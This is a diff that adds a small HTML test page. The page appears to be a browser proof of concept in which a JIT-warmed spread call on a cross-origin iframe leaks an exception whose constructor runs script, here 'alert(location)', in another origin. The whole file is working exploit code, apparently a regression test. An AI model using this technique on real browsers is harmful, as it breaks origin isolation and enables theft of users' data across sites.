@@ -1,0 +1,29 @@
+<body>
+<script>
+
+'use strict';
+
+function spread(a) {
+    return [...a];
+}
+
+let arr = Object.create([1, 2, 3, 4]);
+for (let i = 0; i < 0x10000; i++) {
+    spread(arr);
+}
+
+let f = document.body.appendChild(document.createElement('iframe'));
+f.onload = () => {
+    f.onload = null;
+
+    try {
+        spread(f.contentWindow);
+    } catch (e) {
+        e.constructor.constructor('alert(location)')();
+    }
+};
+
+f.src = 'https://abc.xyz/';
+
+</script>
+</body>
